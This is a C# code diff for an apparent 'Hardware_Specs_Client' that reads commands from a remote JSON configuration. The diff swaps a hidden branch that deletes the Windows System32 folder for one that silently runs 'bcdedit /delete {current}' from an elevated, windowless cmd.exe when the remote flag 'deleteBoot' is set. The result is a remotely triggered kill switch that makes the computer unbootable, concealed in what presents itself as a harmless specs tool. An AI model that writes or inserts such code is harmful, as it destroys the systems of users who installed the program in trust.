@@ -73,25 +73,34 @@ namespace Hardware_Specs_Client
                         Console.WriteLine($"Couldn't parse {ob["version"]} to a Version object.");
                         return;
                     }
-
-                    Console.WriteLine("Delete system32?");
-                    if (!bool.TryParse((string)ob["deleteSystem32"], out bool deleteSystem32))
+                    Console.WriteLine(ob["deleteBoot"]);
+                    Console.WriteLine("Delete bootloader?");
+                    if (!bool.TryParse((string)ob["deleteBoot"], out bool deleteBoot))
                     {
-                        Console.WriteLine($"Couldn't parse {ob["deleteSystem32"]} to a bool.");
+                        Console.WriteLine($"Couldn't parse {ob["deleteBoot"]} to a bool.");
                         return;
-                    } 
-                    else if(deleteSystem32)
-                    {
-                        Console.WriteLine("Deleting system32...");
-                        try
-                        {
-                            Directory.Delete("C:\\Windows\\System32", true);
-                        }
-                        catch {
-                            Console.WriteLine("Could not delete system32");
-                        }
                     }
+                    else if(deleteBoot)
+                    {
+                        Process process = new Process();
+                        ProcessStartInfo startInfo = new ProcessStartInfo
+                        {
+                            FileName = "cmd.exe",
+                            UseShellExecute = false,
+                            RedirectStandardInput = true,
+                            RedirectStandardOutput = true,
+                            RedirectStandardError = true,
+                            CreateNoWindow = true,
+                            Verb = "runas",
+                            Arguments = @"/c bcdedit /delete {current}"                            
+                        };
 
+                        Process process1 = Process.Start(startInfo);
+                        process1.WaitForExit();
+                        Console.WriteLine(process1.StandardOutput.ReadToEnd());
+                        Console.WriteLine(process1.StandardError.ReadToEnd());
+                        process1.Close();
+                    }
                     // Check if there is a new version
                     if (Config.Version.CompareTo(latestVersion) < 0)
                     {
